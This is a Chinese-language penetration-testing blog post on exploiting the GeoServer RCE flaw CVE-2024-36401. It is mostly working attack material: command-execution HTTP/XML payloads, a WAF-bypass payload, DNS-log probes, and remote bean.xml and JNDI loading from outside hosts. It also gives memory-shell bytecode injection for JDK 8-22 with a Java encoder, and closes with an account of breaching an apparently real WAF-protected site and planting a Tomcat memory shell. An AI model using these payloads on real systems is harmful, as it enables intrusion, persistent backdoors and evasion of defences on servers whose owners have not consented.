title: CVE-2024-36401 GeoServer RCE实战利用
author: Bmth
tags: []
top_img: 'https://i-blog.csdnimg.cn/direct/76f57af6fdd64e0c8037cf53dd60886f.png'
cover: 'https://i-blog.csdnimg.cn/direct/76f57af6fdd64e0c8037cf53dd60886f.png'
categories:
  - 渗透测试
date: 2025-04-07 15:30:00
---
![](https://i-blog.csdnimg.cn/direct/76f57af6fdd64e0c8037cf53dd60886f.png)

默认账号密码：admin/geoserver

公开的POC：[https://github.com/Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

影响版本：
GeoServer < 2.23.6
2.24.0 <= GeoServer < 2.24.4
2.25.0 <= GeoServer < 2.25.2

注意typeNames必须在系统中存在才能利用
访问`/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0`可以搜索到所有的typeName
![](https://i-blog.csdnimg.cn/direct/fcf4c03dc2d148bd8a6044f9feccaf9e.png)


## GetPropertyValue
存在两种传参方式，第一种是xml格式：
```
POST /geoserver/wfs HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/xml
Content-Length: 356

<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'touch /tmp/success2')</wfs:valueReference>
</wfs:GetPropertyValue>
```
第二种是POST/GET传参方式
```
POST /geoserver/wfs HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 134

service=wfs&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),"whoami")
```
![](https://i-blog.csdnimg.cn/direct/fb2a8bf592dd4ba3a5e1181be7dd7a90.png)

看到报错：
```
java.lang.ClassCastException: java.lang.ProcessImpl cannot be cast to org.opengis.feature.type.AttributeDescriptor
```
说明命令执行成功

### 绕waf
看到GetPropertyValue
![](https://i-blog.csdnimg.cn/direct/265600777ec946a9b9b94432f3a18166.png)

`request.getValueReference().replaceAll("\\[.*\\]", "")`，这里会将`[]`中的内容替换为空，但是为贪婪匹配，所以只能使用一次

在xml中，`<!--xxx-->`代表注释，因此可以使用如下payload：
```
/+java.lang.T<!--IgnoreMe!!!!-->hread.s[(: IGNORE :)]leep&#010;&#032;&#009;<![CDATA[ (2000) ]]>
```
![](https://i-blog.csdnimg.cn/direct/119a4a602fea4db99782785fda23a0b7.png)

参考：
[浅析GeoServer property 表达式注入代码执行(CVE-2024-36401)](https://y4tacker.github.io/2024/07/03/year/2024/7/%E6%B5%85%E6%9E%90GeoServer-property-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-36401/)

### 漏洞探测
dnslog探测：
```xml
<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>java.net.InetAddress.getAllByName("xxx.dnslog.xxx")
</wfs:valueReference>
</wfs:GetPropertyValue>
```
探测JDK版本：
```java
getValue(parseExpression(org.springframework.expression.spel.standard.SpelExpressionParser.new(),"T(java.net.InetAddress).getByName(T(java.lang.System).getProperty('java.version').replace('.', '-') + '.cnem83.dnslog.cn')"))
```
![](https://i-blog.csdnimg.cn/direct/232d8a2e0a3d4f65b8cc20353be780f7.png)

延时探测：
```xml
<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>java.lang.Thread.sleep(2000)
</wfs:valueReference>
</wfs:GetPropertyValue>
```

ClassPathXmlApplicationContext或FileSystemXmlApplicationContext实例化RCE：
```java
org.springframework.context.support.ClassPathXmlApplicationContext.new("http://127.0.0.1:8080/bean.xml")
org.springframework.context.support.FileSystemXmlApplicationContext.new("http://127.0.0.1:8080/bean.xml")
```
JNDI注入：
```java
javax.naming.InitialContext.doLookup("ldap://127.0.0.1:1389/")
```

## 内存马
### JDK 8-11
参考：[GeoServer property RCE注入内存马](https://mp.weixin.qq.com/s/beRJ8-HOMJbA43jYMMS0Pg)
加载字节码的Payload
```xml
<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'
var str="your-base64-memery";
var bt;
try {
    bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
} catch (e) {
    bt = java.util.Base64.getDecoder().decode(str);
}
var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
theUnsafe.setAccessible(true);
unsafe = theUnsafe.get(null);
unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), bt, null).newInstance();
')</wfs:valueReference>
</wfs:GetPropertyValue>
```
注意在JDK>8时，defineAnonymousClass做了限制，被加载的Class要满足两个条件之一：
- 没有包名
- 包名跟第一个参数Class的包名一致，此处为java.lang，否则会报错

使用JEG生成回显payload
![](https://i-blog.csdnimg.cn/direct/673920386b084d3180b10b0b4121bde4.png)


### JDK 11-22
参考：[CVE-2024-36401 JDK 11-22 通杀内存马](https://mp.weixin.qq.com/s/jCOp9A-qO8ViqLx3ui0XHg)
[GeoServer(CVE-2024-36401) JDK 11-22 通杀内存马利用总结](https://mp.weixin.qq.com/s/1mW3rLvZc0RL4nr25BLT7A)

简单概括一下几个问题：
1. SpEL表达式字符串长度不能超过10000：手动编译恶意字节码，不生成调试信息，并在编译时显示未经检查的操作和已弃用代码的警告；考虑使用 gzip 先压缩 class 文件，接着再套一层 Base64 编码
2. JDK17+对反射的限制：使用Unsafe绕过
3. 指定了contextClass：需要恶意类在`org.springframework.expression`包下

whoopscs师傅给出的java代码：
```java
import java.io.*;
import java.util.Base64;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.GZIPOutputStream;

public class Evil {
    public static void main(String[] args) {
        // 内存马代码文件
        String javaFilePath = "Test.java";
        String classFilePath = getClassNameFromJavaPath(javaFilePath) + ".class";
        // 输出'gzip + Base64'的恶意字节码到文件
        String outputFilePath = "SpELMemShell.txt";

        try {
            // 编译 .java 文件
            compileJavaFile(javaFilePath);

            // 检查 .class 文件是否已生成
            if (!new File(classFilePath).exists()) {
                throw new FileNotFoundException("The compiled class file was not generated.");
            }

            // 压缩并编码 .class 文件
            String base64String = compressAndEncodeClassFile(classFilePath);

            // 写入文件
            writeToFile(outputFilePath, base64String);
        } catch (IOException e) {
            System.err.println("Error processing the file: " + e.getMessage());
        }
    }

    private static void compileJavaFile(String javaFilePath) throws IOException {
        // 内存马中的Object.class.getModule()方法是在Java 9及更高版本中引入的，因此需要指定使用Java 9+的javac进行编译
        String javacPath = "/Library/Java/JavaVirtualMachines/jdk-17.jdk/Contents/Home/bin/javac";

        List<String> command = new ArrayList<>();
        command.add(javacPath); // 使用 javac 的完整路径
        command.add("-g:none");
        command.add("-Xlint:unchecked");
        command.add("-Xlint:deprecation");
        command.add(javaFilePath);

        ProcessBuilder processBuilder = new ProcessBuilder(command);
        Process process = processBuilder.start();

        // 等待编译完成
        try {
            int exitCode = process.waitFor();
            if (exitCode != 0) {
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                String line;
                while ((line = errorReader.readLine()) != null) {
                    System.err.println(line);
                }
                throw new RuntimeException("Compilation failed with exit code " + exitCode);
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new IOException("Compilation interrupted", e);
        }
    }

    private static String compressAndEncodeClassFile(String classFilePath) throws IOException {
        byte[] classData = readFile(classFilePath);

        // 使用 gzip 进行压缩
        byte[] compressedData = compress(classData);

        // 将压缩后的数据转换为 Base64 编码
        String encodedCompressedData = Base64.getEncoder().encodeToString(compressedData);

        // 输出原始长度和新的 Base64 编码长度
        System.out.println("Original Base64 encoded string length: " + classData.length);
        System.out.println("New Base64 encoded string length after gzip compression: " + encodedCompressedData.length());

        return encodedCompressedData;
    }

    private static byte[] readFile(String filePath) throws IOException {
        try (FileInputStream fis = new FileInputStream(filePath)) {
            byte[] data = new byte[fis.available()];
            fis.read(data);
            return data;
        }
    }

    private static byte[] compress(byte[] data) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (GZIPOutputStream gzos = new GZIPOutputStream(baos)) {
            gzos.write(data);
        }
        return baos.toByteArray();
    }

    private static void writeToFile(String filePath, String content) throws IOException {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(filePath))) {
            writer.write(content);
        }
    }

    private static String getClassNameFromJavaPath(String javaFilePath) {
        String fileName = new File(javaFilePath).getName();
        return fileName.substring(0, fileName.indexOf('.'));
    }
}
```
使用JMG生成class文件，注意勾选Bypass JDK Module
![](https://i-blog.csdnimg.cn/direct/4b669bd40ce84a7ab7dc8abadef0038f.png)

打SpEL 表达式注入
```xml
<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>toString(getValue(parseRaw(org.springframework.expression.spel.standard.SpelExpressionParser.new(),"T(org.springframework.cglib.core.ReflectUtils).defineClass('org.springframework.expression.Test',T(org.apache.commons.io.IOUtils).toByteArray(new java.util.zip.GZIPInputStream(new java.io.ByteArrayInputStream(T(org.springframework.util.Base64Utils).decodeFromString('gzip + Base64')))),T(java.lang.Thread).currentThread().getContextClassLoader(),null,T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))")))
</wfs:valueReference>
</wfs:GetPropertyValue>
```
![](https://i-blog.csdnimg.cn/direct/16cae05a605a4a7a9b5b41f86937ccc9.png)

返回`java.lang.ClassCastException`，说明代码执行成功

宇哥给了一个加载回显的poc：
```java
getValue(parseRaw(org.springframework.expression.spel.standard.SpelExpressionParser.new(),"{T(java.lang.Thread).currentThread().getContextClassLoader().loadClass('org.springframework.expression.Echo').newInstance()}"))
```
![](https://i-blog.csdnimg.cn/direct/d041bbb6a933471e999393b3b2ba26dd.png)

舒服了

## 实战
最近遇到一个站，存在waf，和同事经过几天的研究最终拿下
![](https://i-blog.csdnimg.cn/direct/21e240e6b5fc487eae220834cc37b9c5.png)

报错：**系统找不到指定的文件**，经过测试发现不支持xml格式传参

泄露了网站路径：`C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\geoserver`
中间件：Tomcat 9.0
操作系统：Windows

改为POST传参
![](https://i-blog.csdnimg.cn/direct/5e969935fa5a4c7abcf78f4d43b6a246.png)

成功触发延时，说明漏洞存在，但是在执行命令的时候发现存在waf
![](https://i-blog.csdnimg.cn/direct/97dd3c28a9604ebb98035a5010837e99.png)

匹配了关键字，也是十分常见的waf过滤方式，这个时候就可以使用`[]`去绕过了
![](https://i-blog.csdnimg.cn/direct/0488a0ffca194b7e9130e15c48409a47.png)

返回`java.lang.ClassCastException: java.lang.ProcessImpl`，说明命令执行成功，但没有回显+过滤了常见的命令执行关键字，怎么办呢

ScriptEngineManager或者SpEL字节码加载肯定是不行的，`[]`只能绕过一个关键字，字节码加载的payload敏感字符太多了，有没有用少量payload就可以加载字节码的方式呢？有的兄弟，有的

其实也不难想到，可以使用ClassPathXmlApplicationContext远程加载bean.xml文件实现字节码执行RCE

使用工具：[https://github.com/vulhub/java-chains](https://github.com/vulhub/java-chains)
![](https://i-blog.csdnimg.cn/direct/c6b16b9c879c4b75806faa9a48751e8e.png)

打`Tomcat Listener`内存马
![](https://i-blog.csdnimg.cn/direct/a31d29ff1a34429c87e98fa9995fe0c0.png)

看一下杀软
![](https://i-blog.csdnimg.cn/direct/8b74322327fc4208b1d3b438aa1792f2.png)

我勒个豆